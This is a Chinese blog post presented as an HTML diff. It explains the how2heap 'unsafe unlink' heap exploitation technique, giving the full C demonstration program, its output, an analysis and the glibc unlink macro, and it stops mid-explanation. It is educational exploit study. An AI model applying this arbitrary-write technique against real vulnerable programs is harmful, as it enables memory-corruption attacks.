@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juniorprincewang.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="我学习https:&#x2F;&#x2F;github.com&#x2F;shellphish&#x2F;how2heap的时候，遇到unsafe_unlink.c卡住了，琢磨了好久才弄通一些，整理下思路。 unsafe unlink是利用unlink将已经构造好的chunk块释放掉达到任意地址写的目的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap之unsafe unlink">
+<meta property="og:url" content="http://juniorprincewang.github.io/2017/09/11/how2heap-unsafe-unlink/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="我学习https:&#x2F;&#x2F;github.com&#x2F;shellphish&#x2F;how2heap的时候，遇到unsafe_unlink.c卡住了，琢磨了好久才弄通一些，整理下思路。 unsafe unlink是利用unlink将已经构造好的chunk块释放掉达到任意地址写的目的。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://juniorprincewang.github.io/img/how2heap-unsafe-unlink/unsafe_unlink.jpg">
+<meta property="article:published_time" content="2017-09-11T11:56:32.000Z">
+<meta property="article:modified_time" content="2022-01-09T11:09:07.892Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://juniorprincewang.github.io/img/how2heap-unsafe-unlink/unsafe_unlink.jpg">
+
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2017/09/11/how2heap-unsafe-unlink/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://juniorprincewang.github.io/2017/09/11/how2heap-unsafe-unlink/","path":"2017/09/11/how2heap-unsafe-unlink/","title":"how2heap之unsafe unlink"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>how2heap之unsafe unlink | TO DO</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">TO DO</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A8%8B%E5%BA%8F%E5%8F%8A%E8%BE%93%E5%87%BA"><span class="nav-number">1.</span> <span class="nav-text">源程序及输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">关键点</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number"></span> <span class="nav-text">参考</span></a></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">97</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2017/09/11/how2heap-unsafe-unlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="how2heap之unsafe unlink | TO DO">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          how2heap之unsafe unlink
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2017-09-11 19:56:32" itemprop="dateCreated datePublished" datetime="2017-09-11T19:56:32+08:00">2017-09-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-09 19:09:07" itemprop="dateModified" datetime="2022-01-09T19:09:07+08:00">2022-01-09</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>我学习<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap"
+class="uri">https://github.com/shellphish/how2heap</a>的时候，遇到unsafe_unlink.c卡住了，琢磨了好久才弄通一些，整理下思路。
+unsafe
+unlink是利用<code>unlink</code>将已经构造好的chunk块释放掉达到任意地址写的目的。</p>
+<span id="more"></span>
+<h2 id="源程序及输出">源程序及输出</h2>
+<p>程序源码： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uint64_t *chunk0_ptr;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Welcome to unsafe unlink 2.0!\n&quot;);</span><br><span class="line">	printf(&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;);</span><br><span class="line">	printf(&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;);</span><br><span class="line">	printf(&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;);</span><br><span class="line"></span><br><span class="line">	int malloc_size = 0x80; //we want to be big enough not to use fastbins</span><br><span class="line">	int header_size = 2;</span><br><span class="line"></span><br><span class="line">	printf(&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0</span><br><span class="line">	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1</span><br><span class="line">	printf(&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	printf(&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	printf(&quot;We create a fake chunk inside chunk0.\n&quot;);</span><br><span class="line">	printf(&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;);</span><br><span class="line">	chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);</span><br><span class="line">	printf(&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;);</span><br><span class="line">	printf(&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;);</span><br><span class="line">	chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);</span><br><span class="line">	printf(&quot;Fake chunk fd: %p\n&quot;,(void*) chunk0_ptr[2]);</span><br><span class="line">	printf(&quot;Fake chunk bk: %p\n\n&quot;,(void*) chunk0_ptr[3]);</span><br><span class="line"></span><br><span class="line">	printf(&quot;We need to make sure the &#x27;size&#x27; of our fake chunk matches the &#x27;previous_size&#x27; of the next chunk (fd-&gt;prev_size)\n&quot;);</span><br><span class="line">	printf(&quot;With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n&quot;);</span><br><span class="line">	printf(&quot;P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))&quot;);</span><br><span class="line">	printf(&quot;If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).&quot;);</span><br><span class="line">	printf(&quot;We just need to set the *(chunk0_ptr + x) = x, so we can pass the check&quot;);</span><br><span class="line">	printf(&quot;1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing&quot;);</span><br><span class="line">	printf(&quot;2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it&#x27;s fine to pass&quot;);</span><br><span class="line">	printf(&quot;3.Finally we can also set chunk0_ptr = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20&quot;);</span><br><span class="line">	chunk0_ptr[1] = sizeof(size_t);</span><br><span class="line">	printf(&quot;Therefore, we set the &#x27;size&#x27; of our fake chunk to the value of chunk0_ptr[-3]: 0x%08lx\n&quot;, chunk0_ptr[1]);</span><br><span class="line">	printf(&quot;You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;);</span><br><span class="line">	uint64_t *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	printf(&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;);</span><br><span class="line">	printf(&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;);</span><br><span class="line">	chunk1_hdr[0] = malloc_size;</span><br><span class="line">	printf(&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;,(void*)chunk1_hdr[0]);</span><br><span class="line">	printf(&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;);</span><br><span class="line">	chunk1_hdr[1] &amp;= ~1;</span><br><span class="line"></span><br><span class="line">	printf(&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;);</span><br><span class="line">	printf(&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;);</span><br><span class="line">	free(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	printf(&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;);</span><br><span class="line">	char victim_string[8];</span><br><span class="line">	strcpy(victim_string,&quot;Hello!~&quot;);</span><br><span class="line">	chunk0_ptr[3] = (uint64_t) victim_string;</span><br><span class="line"></span><br><span class="line">	printf(&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;);</span><br><span class="line">	printf(&quot;Original value: %s\n&quot;,victim_string);</span><br><span class="line">	chunk0_ptr[0] = 0x4141414142424242LL;</span><br><span class="line">	printf(&quot;New Value: %s\n&quot;,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>程序的编译： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc unsafe_unlink.c -o unsafe_unlink </span><br></pre></td></tr></table></figure> 程序的输出为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to unsafe unlink 2.0!</span><br><span class="line">Tested in Ubuntu 14.04/16.04 64bit.</span><br><span class="line">This technique can be used when you have a pointer at a known location to a region you can call unlink on.</span><br><span class="line">The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.</span><br><span class="line">The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.</span><br><span class="line"></span><br><span class="line">The global chunk0_ptr is at 0x602068, pointing to 0xcba010, and the content is .</span><br><span class="line">The victim chunk we are going to corrupt is at 0xcba0a0</span><br><span class="line"></span><br><span class="line">We create a fake chunk inside chunk0.</span><br><span class="line">We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><br><span class="line">We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><br><span class="line">With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><br><span class="line">Fake chunk fd: 0x602050</span><br><span class="line">Fake chunk bk: 0x602058</span><br><span class="line"></span><br><span class="line">We need to make sure the &#x27;size&#x27; of our fake chunk matches the &#x27;previous_size&#x27; of the next chunk (fd-&gt;prev_size)</span><br><span class="line">With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False</span><br><span class="line">P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).We just need to set the *(chunk0_ptr + x) = x, so we can pass the check1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it&#x27;s fine to pass3.Finally we can also set chunk0_ptr = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20</span><br><span class="line">sizeof(size_t) = 8</span><br><span class="line"></span><br><span class="line">Therefore, we set the &#x27;size&#x27; of our fake chunk to the value of chunk0_ptr[-3]: 0x00000008</span><br><span class="line">You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><span class="line"></span><br><span class="line">We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.</span><br><span class="line"></span><br><span class="line">chunk1_hdr is at 0x7ffc79415270. value is 0xcba090</span><br><span class="line">We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><br><span class="line">It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly</span><br><span class="line">If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80</span><br><span class="line">We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.</span><br><span class="line"></span><br><span class="line">Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.</span><br><span class="line">You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><br><span class="line"></span><br><span class="line">&amp;chunk0_ptr[0] is 0xcba010, chunk0_ptr[0] is 0x00000000</span><br><span class="line">&amp;chunk0_ptr[1] is 0xcba018, chunk0_ptr[1] is 0x00000008</span><br><span class="line">&amp;chunk0_ptr[2] is 0xcba020, chunk0_ptr[2] is 0x00602050</span><br><span class="line">&amp;chunk0_ptr[3] is 0xcba028, chunk0_ptr[3] is 0x00602058</span><br><span class="line"></span><br><span class="line">free chunk1_ptr</span><br><span class="line">&amp;chunk0_ptr[0] is 0x602050, chunk0_ptr[0] is 0x00000000</span><br><span class="line">&amp;chunk0_ptr[1] is 0x602058, chunk0_ptr[1] is 0x00000000</span><br><span class="line">&amp;chunk0_ptr[2] is 0x602060, chunk0_ptr[2] is 0x00000000</span><br><span class="line">&amp;chunk0_ptr[3] is 0x602068, chunk0_ptr[3] is 0x00602050</span><br><span class="line">At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.</span><br><span class="line">victim_string is at 0x7ffc79415280, victim_string is 0x7ffc79415280, content is Hello!~</span><br><span class="line">chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.</span><br><span class="line">Original value: Hello!~</span><br><span class="line">New Value: BBBBAAAA</span><br><span class="line">&amp;chunk0_ptr[0] is 0x7ffc79415280, chunk0_ptr[0] is 0x4141414142424242</span><br><span class="line">&amp;chunk0_ptr[1] is 0x7ffc79415288, chunk0_ptr[1] is 0x3f5863ffa3c2a900</span><br><span class="line">&amp;chunk0_ptr[2] is 0x7ffc79415290, chunk0_ptr[2] is 0x00400c10</span><br><span class="line">&amp;chunk0_ptr[3] is 0x7ffc79415298, chunk0_ptr[3] is 0x7fe85997da40</span><br></pre></td></tr></table></figure>
+这里面有些输出信息是我自己添加的。</p>
+<h2 id="程序分析">程序分析</h2>
+<p>首先我们有个全部变量<code>chunk0_ptr</code>来保存malloc的地址，然后紧接着局部变量<code>chunk1_ptr</code>保存下一次malloc的地址。假设<code>chunk0</code>可以溢出，我们为了利用<code>free</code>函数时<code>unlink</code>操作，需要在<code>chunk0</code>的数据部分构造fake
+chunk（包括size,fd,bk），接着绕过<code>unlink</code>的防御机制，然后覆盖<code>chunk1</code>的堆头来满足释放<code>chunk1</code>时发生<code>consolidate backward</code>，unlink<code>chuck0</code>。
+这样翻译过来就是<code>chunk0_ptr=(uint64_t *)(&amp;chunk0_ptr-3)</code>，意味着<code>chunk0_ptr</code>指向了<code>chunk0_ptr[-3]</code>。之后给<code>chunk0_ptr[3]</code>赋任意可写地址，<code>chunk0_ptr</code>就可以修改该地址的内容，达到任意地址写。</p>
+<h2 id="关键点">关键点</h2>
+<p>关键点是绕过<code>unlink</code>的两个约束。
+<code>malloc.c</code>的源码可参考<a
+target="_blank" rel="noopener" href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html"
+class="uri">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</a>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">	if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">	  malloc_printerr (check_action, &quot;corrupted size vs. prev_size&quot;, P, AV);  \</span><br><span class="line">	FD = P-&gt;fd;                                                                      \</span><br><span class="line">	BK = P-&gt;bk;                                                                      \</span><br><span class="line">	if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">	  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line">	else &#123;                                                                      \</span><br><span class="line">	    FD-&gt;bk = BK;                                                              \</span><br><span class="line">	    BK-&gt;fd = FD;                                                              \</span><br><span class="line">	    if (!in_smallbin_range (chunksize_nomask (P))                              \</span><br><span class="line">	        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;                      \</span><br><span class="line">	        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)              \</span><br><span class="line">	            || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">	          malloc_printerr (check_action,                                      \</span><br><span class="line">	                           &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">	                           P, AV);                                              \</span><br><span class="line">	        if (FD-&gt;fd_nextsize == NULL) &#123;                                      \</span><br><span class="line">	            if (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line">	              FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      \</span><br><span class="line">	            else &#123;                                                              \</span><br><span class="line">	                FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              \</span><br><span class="line">	                FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              \</span><br><span class="line">	                P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              \</span><br><span class="line">	                P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              \</span><br><span class="line">	              &#125;                                                              \</span><br><span class="line">	          &#125; else &#123;                                                              \</span><br><span class="line">	            P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      \</span><br><span class="line">	            P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      \</span><br><span class="line">	          &#125;                                                                      \</span><br><span class="line">	      &#125;                                                                      \</span><br><span class="line">	  &#125;                                                                              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的<code>P</code>是<code>fake chunk</code>，也就是指针<code>chunk0_ptr</code>指向的伪造堆,先通过检查<code>(chunksize(P) != prev_size (next_chunk(P)) == False</code>。
